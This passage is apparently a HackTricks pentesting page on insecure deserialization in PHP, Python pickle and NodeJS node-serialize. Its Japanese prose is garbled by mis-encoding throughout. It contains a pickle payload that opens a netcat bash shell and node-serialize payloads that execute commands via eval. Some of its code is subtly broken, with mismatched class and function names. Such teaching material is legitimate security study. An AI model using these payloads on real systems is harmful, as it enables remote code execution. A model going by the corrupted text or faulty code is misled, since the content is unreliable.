# ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã«**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³**ã¯ã€ã‚ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å¾Œã§å¾©å…ƒã§ãã‚‹ãƒ‡ãƒ¼ã‚¿å½¢å¼ã«å¤‰æ›ã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã§ã™ã€‚äººã€…ã¯ã—ã°ã—ã°ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã«ä¿å­˜ã™ã‚‹ãŸã‚ã€ã¾ãŸã¯é€šä¿¡ã®ä¸€éƒ¨ã¨ã—ã¦é€ä¿¡ã™ã‚‹ãŸã‚ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã¾ã™ã€‚

**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³**ã¯ãã®é€†ã®ãƒ—ãƒ­ã‚»ã‚¹ã§ã€ã‚ã‚‹å½¢å¼ã‹ã‚‰æ§‹é€ åŒ–ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’å–ã‚Šã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å†æ§‹ç¯‰ã—ã¾ã™ã€‚ä»Šæ—¥ã€ãƒ‡ãƒ¼ã‚¿ã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«æœ€ã‚‚äººæ°—ã®ã‚ã‚‹ãƒ‡ãƒ¼ã‚¿å½¢å¼ã¯JSONã§ã™ã€‚ãã®å‰ã¯XMLã§ã—ãŸã€‚

å¤šãã®å ´åˆã€ã‚µãƒ¼ãƒãƒ¼å´ã«ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰æä¾›ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¢ãƒ³ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã‚³ãƒ¼ãƒ‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚\
ã“ã®å ´åˆã€æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã¦ã€ã‚µãƒ¼ãƒãƒ¼å´ã®å‹•ä½œã‚’äºˆæœŸã›ãšã«ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ”»æ’ƒæ–¹æ³•ã‚’å­¦ã¶ãŸã‚ã«èª­ã‚€ã¹ã:** [**https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)

## PHP

ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã•ã‚Œã‚‹ãƒã‚¸ãƒƒã‚¯ãƒ¡ã‚½ãƒƒãƒ‰:

* `__sleep` ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«å‘¼ã°ã‚Œã€é…åˆ—ã«æˆ»ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™

ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã•ã‚Œã‚‹ãƒã‚¸ãƒƒã‚¯ãƒ¡ã‚½ãƒƒãƒ‰:

* `__wakeup` ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«å‘¼ã°ã‚Œã¾ã™ã€‚
* `__unserialize` ã¯ã€å­˜åœ¨ã™ã‚‹å ´åˆã€`__wakeup` ã®ä»£ã‚ã‚Šã«å‘¼ã°ã‚Œã¾ã™ã€‚
* `__destruct` ã¯PHPã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒçµ‚äº†ã—ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒç ´å£Šã•ã‚Œã‚‹ã¨ãã«å‘¼ã°ã‚Œã¾ã™ã€‚
* `__toString` ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ–‡å­—åˆ—ã¨ã—ã¦ä½¿ç”¨ã—ã¾ã™ãŒã€ãã‚Œã«åŸºã¥ã„ã¦é–¢æ•°å‘¼ã³å‡ºã—å†…ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚€ã¾ãŸã¯ãã‚Œä»¥ä¸Šã®ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
çµæœã‚’è¦‹ã‚‹ã¨ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã¨ãã«ã€é–¢æ•° **`__wakeup`** ã¨ **`__destruct`** ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã„ãã¤ã‹ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã§ã¯ã€å±æ€§ã‚’å°åˆ·ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ãã« **`__toString`** é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã¨ã‚ã‚Šã¾ã™ãŒã€ã©ã†ã‚„ã‚‰ãã‚Œã¯**ã‚‚ã†èµ·ã“ã‚‰ãªã„**ã‚ˆã†ã§ã™ã€‚

{% hint style="warning" %}
ã‚¯ãƒ©ã‚¹ã«å®Ÿè£…ã•ã‚Œã¦ã„ã‚‹å ´åˆã€`__wakeup()` ã®ä»£ã‚ã‚Šã«ãƒ¡ã‚½ãƒƒãƒ‰ **`__unserialize(array $data)`** ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’é…åˆ—ã¨ã—ã¦æä¾›ã™ã‚‹ã“ã¨ã§ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¢ãƒ³ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã§ãã¾ã™ã€‚ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ã‚¢ãƒ³ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ™‚ã«å¿…è¦ãªã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚
```php
phpCopy codeclass MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

**PHPã®ä¾‹ã«ã¤ã„ã¦ã¯ã“ã¡ã‚‰ã§èª¬æ˜ã•ã‚Œã¦ã„ã¾ã™**ï¼š[https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)ã€ã“ã¡ã‚‰ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)ã€ã¾ãŸã¯ã“ã¡ã‚‰ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload ã‚¯ãƒ©ã‚¹

PHPã®autoloadæ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã®phpãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€ã•ã‚‰ã«å¤šãã®ã“ã¨ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### å‚ç…§å€¤ã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º

ä½•ã‚‰ã‹ã®ç†ç”±ã§ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸåˆ¥ã®å€¤ã¸ã®**å‚ç…§ã¨ã—ã¦å€¤ã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã—ãŸã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (PHPã®ysoserial)

[**PHPGGC**](https://github.com/ambionics/phpggc) ã¯ã€PHPã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚\
ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰å†…ã§ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã‚’**è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ããªã„å ´åˆãŒã„ãã¤ã‹ã‚ã‚Šã¾ã™ãŒ**ã€å¤–éƒ¨ã®PHPæ‹¡å¼µæ©Ÿèƒ½ã®ã‚³ãƒ¼ãƒ‰ã‚’**æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**\
å¯èƒ½ã§ã‚ã‚Œã°ã€ã‚µãƒ¼ãƒãƒ¼ã®`phpinfo()`ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ï¼ˆ**PHPGGC**ã®**ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ã«ã‚‚ï¼‰æ‚ªç”¨ã§ãã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’**æ¤œç´¢ã—ã¦ãã ã•ã„ã€‚**

### phar:// ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³

ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®PHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã›ãšã«èª­ã¿è¾¼ã‚€ã ã‘ã®LFIã‚’è¦‹ã¤ã‘ãŸå ´åˆã€ä¾‹ãˆã° _**file\_get\_contents(), fopen(), file() ã‚„ file\_exists(), md5\_file(), filemtime() ã‚„ filesize()**_**ãªã©ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€‚** **phar** ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€**éš›ã«ç™ºç”Ÿã™ã‚‹**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®æŠ•ç¨¿ã‚’èª­ã‚“ã§ãã ã•ã„ï¼š

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚¢ãƒ³ãƒ”ã‚¯ãƒ«ã•ã‚Œã‚‹ã¨ã€_\_\_reduce\_\__ é–¢æ•°ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚\
æ‚ªç”¨ã•ã‚ŒãŸå ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¯ã‚¨ãƒ©ãƒ¼ã‚’è¿”ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
**pickle jails** ã‹ã‚‰ã®è„±å‡ºã«ã¤ã„ã¦ã®è©³ç´°ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€Pythonã®yamlsãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§**å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹æŠ€è¡“**ã‚’ç´¹ä»‹ã—ã€**Pickle, PyYAML, jsonpickle, ruamel.yaml** ã«å¯¾ã™ã‚‹RCEãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãƒ„ãƒ¼ãƒ«ã«ã¤ã„ã¦èª¬æ˜ã—ã¦ã„ã¾ã™:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JSã«ã¯PHPã‚„Pythonã®ã‚ˆã†ã«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã ã‘ã§å®Ÿè¡Œã•ã‚Œã‚‹**"ãƒã‚¸ãƒƒã‚¯"é–¢æ•°**ã¯**ã‚ã‚Šã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€**`toString`**, **`valueOf`**, **`toJSON`** ãªã©ã€ç›´æ¥å‘¼ã³å‡ºã•ãªãã¦ã‚‚**é »ç¹ã«ä½¿ç”¨ã•ã‚Œã‚‹é–¢æ•°**ãŒã‚ã‚Šã¾ã™ã€‚\
ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹å ´åˆã€ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã«**æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚ã“ã‚Œã‚‰ãŒå‘¼ã³å‡ºã•ã‚ŒãŸã¨ãã«ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

é–¢æ•°ã‚’ç›´æ¥å‘¼ã³å‡ºã•ãšã«**"ãƒã‚¸ãƒƒã‚¯"ãªæ–¹æ³•ã§é–¢æ•°ã‚’å‘¼ã³å‡ºã™**åˆ¥ã®æ–¹æ³•ã¯ã€**éåŒæœŸé–¢æ•°**ï¼ˆãƒ—ãƒ­ãƒŸã‚¹ï¼‰ã«ã‚ˆã£ã¦è¿”ã•ã‚Œã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ãªãœãªã‚‰ã€ãã®**è¿”ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã‚’**é–¢æ•°å‹ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£**ã‚’æŒã¤åˆ¥ã®**ãƒ—ãƒ­ãƒŸã‚¹**ã«**å¤‰æ›**ã™ã‚‹ã¨ã€ä»–ã®ãƒ—ãƒ­ãƒŸã‚¹ã«ã‚ˆã£ã¦è¿”ã•ã‚Œã‚‹ã ã‘ã§**å®Ÿè¡Œã•ã‚Œã‚‹**ã‹ã‚‰ã§ã™ã€‚è©³ç´°ã¯[_**ã“ã®ãƒªãƒ³ã‚¯**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ã¨ `prototype` æ±šæŸ“

ã“ã®æŠ€è¡“ã«ã¤ã„ã¦å­¦ã³ãŸã„å ´åˆã¯ã€**æ¬¡ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’ã”è¦§ãã ã•ã„**ï¼š

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯é–¢æ•°ã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ä¾‹ï¼š
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
ä¾‹ã§è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ã€é–¢æ•°ãŒã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«ã¯ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã« `_$$ND_FUNC$$_` ãƒ•ãƒ©ã‚°ãŒè¿½åŠ ã•ã‚Œã¾ã™ã€‚

ãƒ•ã‚¡ã‚¤ãƒ« `node-serialize/lib/serialize.js` ã®ä¸­ã§ã€åŒã˜ãƒ•ãƒ©ã‚°ã¨ã‚³ãƒ¼ãƒ‰ãŒãã‚Œã‚’ã©ã®ã‚ˆã†ã«ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

æœ€å¾Œã®ã‚³ãƒ¼ãƒ‰ãƒ–ãƒ­ãƒƒã‚¯ã§è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ã€**ãƒ•ãƒ©ã‚°ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆ** `eval` ãŒé–¢æ•°ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«ä½¿ç”¨ã•ã‚Œã‚‹ã®ã§ã€åŸºæœ¬çš„ã« **ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ãŒ `eval` é–¢æ•°å†…ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™**ã€‚

ã—ã‹ã—ã€**å˜ã«é–¢æ•°ã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã ã‘ã§ã¯** å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“ã€‚ä½•ã‚‰ã‹ã®ã‚³ãƒ¼ãƒ‰ã®éƒ¨åˆ†ãŒ **ç§ãŸã¡ã®ä¾‹ã§ `y.rce` ã‚’å‘¼ã³å‡ºã—ã¦ã„ã‚‹** å¿…è¦ãŒã‚ã‚Šã€ãã‚Œã¯éå¸¸ã«**ã‚ã‚Šãã†ã«ãªã„**ã§ã™ã€‚\
ã¨ã«ã‹ãã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ **æ‹¬å¼§ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§å¤‰æ›´ã™ã‚‹** ã“ã¨ã§ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã¨ãã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸé–¢æ•°ã‚’è‡ªå‹•çš„ã«å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
æ¬¡ã®ã‚³ãƒ¼ãƒ‰ãƒ–ãƒ­ãƒƒã‚¯ã§ã¯ **æœ€å¾Œã®æ‹¬å¼§ã«æ³¨æ„** ã—ã€`unserialize` é–¢æ•°ãŒè‡ªå‹•çš„ã«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¦ãã ã•ã„ï¼š
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
```markdown
å‰ã«ç¤ºã•ã‚ŒãŸã‚ˆã†ã«ã€ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯`_$$ND_FUNC$$_`ã®å¾Œã®ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—ã—ã€`eval`ã‚’ä½¿ç”¨ã—ã¦**å®Ÿè¡Œã—ã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€**è‡ªå‹•å®Ÿè¡Œã‚³ãƒ¼ãƒ‰**ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€é–¢æ•°ä½œæˆã®éƒ¨åˆ†ã¨æœ€å¾Œã®æ‹¬å¼§ã‚’**å‰Šé™¤ã—**ã€æ¬¡ã®ä¾‹ã®ã‚ˆã†ã«**JSã®ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã‚’å®Ÿè¡Œã™ã‚‹ã ã‘ã§ã™**ã€‚
```
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
ä»¥ä¸‹ã¯ã€ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã®**ã•ã‚‰ãªã‚‹æƒ…å ±**ã‚’[**ã“ã¡ã‚‰ã§è¦‹ã¤ã‘ã‚‹**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)ã“ã¨ãŒã§ãã¾ã™ã€‚

### [funcster](https://www.npmjs.com/package/funcster)

